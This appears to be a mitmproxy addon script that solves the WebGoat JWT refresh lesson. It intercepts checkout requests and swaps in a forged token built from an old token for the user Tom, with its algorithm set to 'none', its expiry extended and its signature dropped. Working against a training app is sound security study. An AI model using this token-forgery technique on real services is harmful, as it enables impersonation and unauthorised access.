from mitmproxy import http
from mitmproxy import ctx

import base64
import requests
import json

# from requests import Request, Session

REFRESH_URL = 'http://localhost:8000/WebGoat/JWT/refresh/newToken'

LOGIN_URL = 'http://localhost:8000/WebGoat/JWT/refresh/login'

OLD_TOM_ACCESS_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q'

def base64_to_dict(encoded):
  decoded = base64.urlsafe_b64decode(encoded + '==')
  return json.loads(decoded)

def dict_to_base64(decoded) -> str:
  stringified = json.dumps(decoded, separators=(',', ':'))  
  return (
    base64.b64encode(stringified.encode('utf-8'))).replace(b'=', b'').decode('utf-8')

def request(flow: http.HTTPFlow) -> None:

  if 'refresh/checkout' in flow.request.url:
    headers_copy = flow.request.headers.copy()
    headers_copy['Content-Type'] = 'application/json'
    # Use old Tom token.
    _, payload, _ = OLD_TOM_ACCESS_TOKEN.split('.')
    # Change algorithm to none.
    header = dict_to_base64({"alg": "none"})
    decoded_payload = base64_to_dict(payload)
    # Modify expiry date (to future).
    decoded_payload['exp'] = 2526217811
    modified_token = f'{header}.{dict_to_base64(decoded_payload)}.'    
    flow.request.headers['Authorization'] = 'Bearer ' + modified_token

def response(flow: http.HTTPFlow) -> None:
  return
